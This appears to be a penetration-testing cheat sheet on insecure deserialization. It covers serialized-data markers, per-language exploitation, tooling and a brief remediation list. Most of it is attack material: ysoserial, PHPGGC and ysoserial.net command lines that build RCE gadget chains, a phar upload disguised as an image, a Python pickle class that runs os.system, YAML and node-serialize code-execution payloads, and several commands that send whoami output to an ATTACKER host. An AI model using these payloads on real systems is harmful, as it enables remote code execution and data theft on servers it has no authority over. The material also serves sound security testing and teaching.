# Insecure Deserialization

Deserialization turns a byte stream back into an in-memory object. When the stream is attacker-controlled and the language/library reconstructs arbitrary types (and runs magic methods during the process), it becomes **remote code execution**. Part of OWASP A08:2021 (Software & Data Integrity Failures). High severity, frequently unauthenticated, and detectable from recognizable serialized formats.

---

## Detection — recognize serialized data

| Format | Marker (start) | Notes |
|--------|----------------|-------|
| **Java** | `AC ED 00 05` (hex) / `rO0` (base64) / `H4sIA` (gzip+b64) | Look in cookies, hidden fields, `viewstate`, RMI/JMX, params |
| **PHP** | `O:4:"User":...`, `a:2:{...}`, `s:5:"hello"` | Cookies, `__SESSION`, `data=` params, phar metadata |
| **.NET** | `AAEAAAD/////` (BinaryFormatter b64), `__VIEWSTATE=` | ViewState, remoting, `LosFormatter` |
| **Python** | pickle: `\x80\x04`, `gASV`/`gAS` (b64), `(dp0` | Any pickle.loads on input |
| **Ruby** | `\x04\x08` (Marshal), YAML `--- !ruby/object:` | Marshal.load, unsafe YAML.load |
| **Node** | `_$$ND_FUNC$$_`, JSON with `rce` via node-serialize | `node-serialize`, `serialize-javascript` |

```bash
# Quickly classify a blob
echo "rO0ABXNyAB..." | base64 -d | xxd | head     # AC ED -> Java
echo "$BLOB" | base64 -d | head -c 4 | xxd         # 80 04 -> pickle
```

---

## Exploitation by language

### Java — ysoserial (gadget chains)

The vuln is `ObjectInputStream.readObject()` on attacker bytes. RCE comes from **gadget chains** present in libraries on the classpath (Apache Commons Collections, Spring, Groovy, etc.).

```bash
# Generate a payload (pick the chain matching libs on the target)
java -jar ysoserial.jar CommonsCollections5 'curl http://ATTACKER/$(whoami)' > payload.bin
java -jar ysoserial.jar CommonsCollections6 'nslookup x.oast.fun' | base64 -w0

# Common chains to try in order
CommonsCollections1..7   Spring1/2   Groovy1   Hibernate1/2   JRMPClient/Listener
ROME   Clojure   C3P0   Jdk7u21   URLDNS (detection-only DNS callback)

# Detection without RCE — URLDNS triggers a DNS lookup if readObject is called
java -jar ysoserial.jar URLDNS "http://java.oast.fun" | base64 -w0
```

Deliver as base64 in the cookie/param/field that holds the serialized object. For **JMX/RMI/JNDI** sinks, use `JRMPListener` + `JRMPClient` or a JNDI injection (`ldap://attacker/Exploit`) — see log4shell-style JNDI.

```bash
# ysoserial JRMP listener for deferred/2-stage chains
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
```

### PHP — object injection & phar

Magic methods (`__wakeup`, `__destruct`, `__toString`, `__call`) fire during/after `unserialize()`. Build a "POP chain" (Property-Oriented Programming) from classes in scope.

```php
// Inject into a param that gets unserialize()'d
O:8:"Example":1:{s:4:"cmd";s:7:"id;pwd";}

// Generic PHP POP chain RCE pattern (Monolog/Guzzle/Laravel/Symfony gadgets exist in PHPGGC)
```

```bash
# PHPGGC = ysoserial for PHP — generate chains for known frameworks
phpggc -l                                  # list gadget chains
phpggc Laravel/RCE9 system id              # build a Laravel RCE chain
phpggc Monolog/RCE1 system id -b           # base64
phpggc Symfony/RCE4 system id
```

**Phar deserialization** — no `unserialize()` call needed. Any filesystem function (`file_exists`, `fopen`, `getimagesize`, `md5_file`) on a `phar://` path deserializes the phar's manifest metadata:

```bash
# Build a malicious phar whose metadata is a POP-chain object, disguise as image
phpggc --phar phar -o evil.phar Monolog/RCE1 system 'id'
# Upload evil.phar (rename evil.jpg), then trigger:
#   ?file=phar://./uploads/evil.jpg/test
```

### .NET — ysoserial.net & ViewState

```bash
# BinaryFormatter / LosFormatter / Json.NET etc.
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc" -o base64
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" \
  --generator=<__VIEWSTATEGENERATOR> --validationkey=<KEY> --validationalg=SHA1
```

**ViewState** is the classic .NET sink. If MAC validation is **disabled** (`enableViewStateMac=false`) you get free RCE. If enabled, you need the machineKey (`validationKey`/`decryptionKey`) — frequently leaked via LFI of `web.config`, in source, or guessable (public sample keys).

```bash
# Identify ViewState MAC state with Burp / viewgen
viewgen --webconfig web.config -m -c "cmd /c whoami"   # if you have the keys
blacklist3r / AspDotNetWrapper.exe                       # crack/identify machineKey
```

### Python — pickle

`pickle.loads()` executes `__reduce__` on deserialization. **Never** safe on untrusted input.

```python
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ("id; curl http://ATTACKER/$(whoami)",))
print(base64.b64encode(pickle.dumps(RCE())).decode())
# Deliver the base64 to any pickle.loads / pandas.read_pickle / joblib.load / torch.load sink
```

Also: PyYAML `yaml.load(x)` (without `SafeLoader`) → `!!python/object/apply:os.system ["id"]`.

```yaml
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]
```

### Ruby — Marshal & YAML

```ruby
# Marshal.load on attacker bytes -> universal gadget (Gem::Requirement chains)
# Use universal_pwn / known Ruby gadget for the installed gems
# Unsafe YAML
--- !ruby/object:Gem::Installer
  i: x
--- !ruby/hash:Gem::SpecFetcher ...   # known psych/Marshal chains
```

### Node.js

```javascript
// node-serialize: IIFE in a function value executes on unserialize()
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()"}
```

---

## OOB / blind confirmation

When you can't see output, prove deserialization with a callback before chasing RCE:

```bash
# Java: URLDNS chain -> DNS lookup only
java -jar ysoserial.jar URLDNS "http://uniq.oast.fun" | base64 -w0
# Any lang: payload that does curl/nslookup to your collaborator
```

A DNS/HTTP hit confirms the sink even on hardened (no-stdout) targets.

---

## Tooling

| Tool | Use |
|------|-----|
| **ysoserial** | Java gadget-chain payloads |
| **ysoserial.net** | .NET payloads + ViewState |
| **PHPGGC** | PHP POP chains + phar builder |
| **GadgetProbe** (Burp) | Remotely enumerate which Java libs/gadgets are on the classpath |
| **Java Deserialization Scanner** (Burp) | Detect + exploit Java deser |
| **Freddy** (Burp) | Detect deser/code-injection across Java & .NET |
| **viewgen / blacklist3r** | ViewState machineKey work |
| **marshalsec** | JNDI/RMI/LDAP exploitation servers |

---

## Remediation

- **Do not deserialize untrusted data.** Prefer data-only formats (JSON/Protobuf) with explicit schemas.
- If unavoidable: enforce **type allowlists** (Java `ObjectInputFilter` / `validateObject`), sign+verify the blob (HMAC) before deserializing.
- Keep libraries patched; remove unused gadget-rich deps from the classpath.
- PHP: avoid `unserialize()` on user input; block `phar://` (PHP 8 doesn't auto-deserialize phar metadata in most fs functions but verify). Use `json_decode`.
- .NET: avoid `BinaryFormatter` (obsolete/removed); keep ViewState MAC + encryption on, protect machineKey.
- Python: only `pickle`/`yaml.load` trusted data; use `yaml.safe_load`.

---

## Cheatsheet

```text
# Identify
AC ED 00 05 / rO0  -> Java     80 04 / gASV -> pickle
O:4:"..." / a:2:{ -> PHP       AAEAAAD///// -> .NET BinaryFormatter
__VIEWSTATE= -> .NET ViewState  \x04\x08 -> Ruby Marshal
# Java RCE
java -jar ysoserial.jar CommonsCollections5 'id' | base64 -w0
# Java detect (DNS)
java -jar ysoserial.jar URLDNS http://x.oast.fun | base64 -w0
# PHP
phpggc Laravel/RCE9 system id -b
phpggc --phar phar -o evil.phar Monolog/RCE1 system id   # phar:// trigger
# .NET ViewState (no MAC)
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" --generator=...
# Python pickle  (__reduce__ -> os.system)
# YAML
!!python/object/apply:os.system ["id"]
```

---

## References

- PortSwigger — Insecure deserialization: https://portswigger.net/web-security/deserialization
- PortSwigger — Exploiting deserialization: https://portswigger.net/web-security/deserialization/exploiting
- PayloadsAllTheThings — Insecure Deserialization: https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/
- HackTricks — Deserialization: https://hacktricks.wiki/en/pentesting-web/deserialization/index.html
- ysoserial: https://github.com/frohoff/ysoserial
- ysoserial.net: https://github.com/pwntester/ysoserial.net
- PHPGGC: https://github.com/ambionics/phpggc
- OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
